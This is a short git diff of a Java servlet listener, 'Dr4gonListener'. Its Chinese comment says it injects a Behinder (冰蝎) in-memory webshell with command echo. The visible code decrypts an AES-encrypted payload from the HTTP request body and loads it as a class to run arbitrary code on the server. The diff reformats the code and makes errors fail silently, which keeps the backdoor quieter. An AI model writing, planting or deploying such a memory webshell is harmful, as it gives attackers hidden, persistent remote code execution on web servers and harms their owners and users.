@@ -17,9 +17,7 @@ import java.lang.reflect.Field;
 
 public class Dr4gonListener implements ServletRequestListener {
     @Override
-    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
-    }
-
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) { }
     //listener实现回显+注入冰蝎内存马
     @Override
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
@@ -62,8 +60,7 @@ public class Dr4gonListener implements ServletRequestListener {
                 c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                 new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
             }
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Exception ignored) {
         }
     }
 }
